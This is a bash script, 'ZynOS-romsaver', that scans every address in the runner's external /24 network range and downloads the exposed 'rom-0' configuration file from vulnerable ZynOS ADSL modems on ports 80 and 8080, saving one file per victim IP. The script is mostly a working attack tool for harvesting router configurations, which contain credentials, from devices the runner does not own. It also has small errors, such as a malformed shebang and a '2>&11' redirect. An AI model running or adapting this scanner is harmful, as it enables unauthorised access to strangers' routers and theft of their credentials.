#/bin/bash
#
# ZynOS-romsaver ~ collect vulnerable ADSL Modem's romfile
# Copyright (c) 2014 Ghozy Arif Fajri <gojigeje@gmail.com>
# License: The MIT License (MIT)
#

## ignore this, for my router
# mkdir -p /root/script/romsaver
# cd /root/script/romsaver

start() {

  pausetime="5"
  tanggal=$(date +%Y-%m-%d_%H%M%S)
  mkdir -p "logs" "rom/$tanggal"
  echo "[Zynos-Romsaver] v0.1 by @gojigeje ~ started at $tanggal"
  echo "[Zynos-Romsaver] v0.1 by @gojigeje ~ started at $tanggal" >> "logs/$tanggal"

  # cek online first
  if eval "ping -c 1 8.8.4.4 -w 2 > /dev/null 2>&1"; then
    
    # online, get external IP
    echo -n "- Getting external IP address.. "
    echo -n "- Getting external IP address.. " >> "logs/$tanggal"
    ip_curl=$(curl -s http://wtfismyip.com/text | sed 's/\.[0-9]*$//')
    ip_wget=$(wget -q -O - http://myexternalip.com/raw | sed 's/\.[0-9]*$//')
    echo "OK"
    echo "OK" >> "logs/$tanggal"

    # use non empty value
    if [[ ! -z "$ip_curl" ]]; then
      prefix="$ip_curl"
    else
      if [[ ! -z "$ip_wget" ]]; then
        prefix="$ip_wget"
      else
        echo "ERROR! - Cannot get my external IP address :("
          echo "ERROR! - Cannot get my external IP address :(" >> "logs/$tanggal"
        exit 1
      fi
    fi

  else
    echo "ERROR! - Not online :("
      echo "ERROR! - Not online :(" >> "logs/$tanggal"
    exit 1
  fi
  echo "- Target Prefix: $prefix"
  echo "- Target Prefix: $prefix" >> "logs/$tanggal"
  echo "- Scanning target IP address: $prefix.1 - $prefix.255"
  echo "- Scanning target IP address: $prefix.1 - $prefix.255" >> "logs/$tanggal"
  echo "" 
  echo ""  >> "logs/$tanggal"
  # twit_mulai
  scan_range 2> /dev/null
  # twit_hasil
}

cekonline() {
  if eval "ping -c 1 8.8.4.4 -w 2 > /dev/null 2>&1"; then
    isonline="1"
  else
    isonline="0"
  fi

  if [[ $isonline -gt 0 ]]; then
    if [[ $paused -gt 0 ]]; then
      echo -e "\e[1;92m# OK Connected! \e[96m(Resuming scan..)\e[0;39m"
      echo "# OK Connected! (Resuming scan..)" >> "logs/$tanggal"
      paused="0"
    fi
  else
    if [[ $paused -gt 0 ]]; then
      sleep $pausetime
      cekonline
    else
      echo -e "\e[1;93m# WARNING: \e[0;93mCan't connect to internet! \e[96m(pausing untill connected..)\e[0;39m"
      echo "# WARNING: Can't connect to internet! (pausing untill connected..)" >> "logs/$tanggal"
      paused="1"
      cekonline
    fi
  fi
}

cekrom() {
  mime=$(file -b --mime-type "rom/$tanggal/$1")
  if [[ "$mime" = "application/octet-stream" ]]; then
    echo -e "\e[0;92mMimetype OK.. Rom Saved.. \e[0;39m"
    echo "Mimetype OK.. Rom Saved.." >> "logs/$tanggal"
  else
    echo -e "\e[31mFailed! -mimetype- wrong mimetype\e[0;39m"
    echo "Failed! -mimetype- wrong mimetype" >> "logs/$tanggal"
    rm "rom/$tanggal/$1"
  fi

}

scan_range() {
  for i in $prefix.{1..255}
  do
    cekonline

    echo -n "$i > "
    echo -n "$i > " >> "logs/$tanggal"
    wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i/rom-0"
    EXIT_CODE=$?

    if [ $EXIT_CODE -gt 0 ];
      then
        # coba port 8080
        wget --timeout=2 --tries=1 --spider -rq -l 1 "http://$i:8080/rom-0"
        EXIT_CODE=$?

        if [ $EXIT_CODE -gt 0 ];
          then
            echo -e "\e[31mFailed! -not vulnerable?- \e[0;39m"
            echo "Failed! -not vulnerable?-" >> "logs/$tanggal"
        else
          wget -q "http://$i:8080/rom-0" -O "rom/$tanggal/$i" &
          PID=$!
          sleep 5
          PSPID=$(ps | grep $PID | grep -v grep)
          if [ "$PSPID" != "" ]; then
            # macet
            kill $PID > /dev/null 2>&1
            echo -e "\e[31mFailed! -timeout- download 8080\e[0;39m"
            echo "Failed! -timeout- download 8080" >> "logs/$tanggal"
            rm "rom/$tanggal/$i" > /dev/null 2>&1
          else
            # ok
            cekrom "$i" "8080"
          fi
        fi

    else
      wget -q "http://$i/rom-0" -O "rom/$tanggal/$i" &
      PID=$!
      sleep 5
      PSPID=$(ps | grep $PID | grep -v grep)
      if [ "$PSPID" != "" ]; then
        # macet
        kill $PID > /dev/null 2>&1
        echo -e "\e[31mFailed! -timeout- download 80\e[0;39m"
        echo "Failed! -timeout- download 80" >> "logs/$tanggal"
        rm "rom/$tanggal/$i" > /dev/null 2>&11
      else
        # ok
        cekrom "$i"
      fi

    fi

  done
}

# twit_hasil() {

# }

start "$@"
# rm "rom/*" > /dev/null 2>&1


# cek file smaller than 7kb ||| find . -type f -size -7k | wc -l
# count last scan / count total
